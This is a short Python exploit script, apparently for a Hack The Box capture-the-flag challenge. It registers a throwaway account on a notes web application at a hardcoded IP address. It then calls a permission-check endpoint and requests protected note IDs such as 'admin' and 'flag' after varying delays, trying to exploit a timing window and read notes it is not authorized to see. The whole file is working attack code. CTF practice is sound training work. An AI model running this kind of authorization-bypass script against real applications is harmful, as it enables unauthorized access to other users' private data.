#!/usr/bin/env python3
import requests
import threading
import time

BASE_URL = "http://83.136.255.203:47148"

email = f"timing{int(time.time()*1000)}@test.com"
r = requests.post(f"{BASE_URL}/api/auth/register",
                 json={"email": email, "password": "test123"})
TOKEN = r.json()['token']
headers = {"Authorization": f"Bearer {TOKEN}"}

my_note = requests.get(f"{BASE_URL}/api/notes", headers=headers).json()['notes'][0]['id']

print(f"[*] User: {email}")
print(f"[*] My note: {my_note}")

# Protected IDs that exist
protected_ids = ["admin", "root", "system", "secret", "challenge", "htb", "flag"]

for target_id in protected_ids:
    print(f"\n[*] Target: {target_id}")
    
    # Try with different delays
    for delay_ms in [0, 1, 5, 10, 20, 50, 100, 150, 200]:
        # Call check-permission
        requests.get(f"{BASE_URL}/api/notes/{my_note}/check-permission", headers=headers)
        
        # Wait specific delay
        if delay_ms > 0:
            time.sleep(delay_ms / 1000.0)
        
        # Try to access
        r = requests.get(f"{BASE_URL}/api/notes/{target_id}", headers=headers)
        result = r.json()
        
        if result.get('success'):
            content = result.get('note', {}).get('content', '')
            print(f"  [!!!] SUCCESS with {delay_ms}ms delay!")
            print(f"       Content: {content}")
            
            if 'HTB{' in content:
                print(f"\n  [!!!!!!!] FLAG FOUND: {content}")
                exit(0)
            break
        elif delay_ms == 100:
            error = result.get('error', 'Unknown')
            print(f"  Failed with 100ms (app delay): {error}")

print("\n[*] No flag found")
